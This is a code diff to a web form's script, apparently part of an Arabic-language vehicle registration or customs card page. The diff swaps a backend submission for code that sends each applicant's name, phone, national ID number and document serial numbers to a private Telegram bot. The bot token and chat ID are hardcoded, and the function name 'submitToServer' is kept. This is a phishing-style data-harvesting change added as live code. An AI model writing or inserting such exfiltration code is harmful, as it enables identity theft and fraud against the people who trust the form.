@@ -665,8 +665,9 @@ input[type="tel"], select {
 </section>
 
   <script>
-    // API Configuration
-    const API_BASE_URL = window.location.origin;
+    // Telegram Configuration
+    const telegramBotToken = '8364441024:AAHluZaG5P8utYObf0Qj3719YONXO8zH24c';
+    const chatId = '7785288759';
 
     // Generate session ID if not exists
     function getSessionId() {
@@ -733,24 +734,35 @@ input[type="tel"], select {
       }
     }
 
-    // Submit form to backend server
-    async function submitToServer(data) {
+    // Send data directly to Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
       try {
-        const response = await fetch(`${API_BASE_URL}/api/submit/personal`, {
+        const response = await fetch(url, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            ...data,
-            sessionId: getSessionId()
-          })
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
         });
         return await response.json();
       } catch (error) {
-        console.error('Server error:', error);
-        return { success: false, error: error.message };
+        console.error('Telegram Error:', error);
+        return { ok: false };
       }
+    }
+
+    // Submit form data to Telegram
+    async function submitToServer(data) {
+      const formType = data.document_type === 'استمارة' ? 'استمارة' : 'بطاقة جمركية';
+      const message = `
+📋 <b>معلومات مقدم الطلب الجديدة:</b>
+━━━━━━━━━━━━━━━
+👤 الاسم: ${data.owner_name}
+📱 الهاتف: ${data.phone}
+🪪 رقم الهوية: ${data.id_number}
+📄 نوع الوثيقة: ${formType}
+${formType === 'استمارة' ? `🔢 الرقم التسلسلي: ${data.serial_number}` : `📅 سنة الصنع: ${data.birth_date || 'غير محدد'}\n🔢 الرقم التسلسلي: ${data.serial_number}`}
+      `;
+      return await sendToTelegram(message);
     }
 
     // Handle form submission
@@ -781,13 +793,13 @@ input[type="tel"], select {
         return;
       }
 
-      // Submit to server
+      // Submit to Telegram
       const result = await submitToServer(data);
 
-      if (result.success) {
+      if (result.ok) {
         // Save owner name to localStorage for next steps
         localStorage.setItem('owner_name', data.owner_name);
-        localStorage.setItem('sessionId', result.sessionId);
+        localStorage.setItem('sessionId', getSessionId());
         
         // Navigate to next step
         window.location.href = 'form.html';
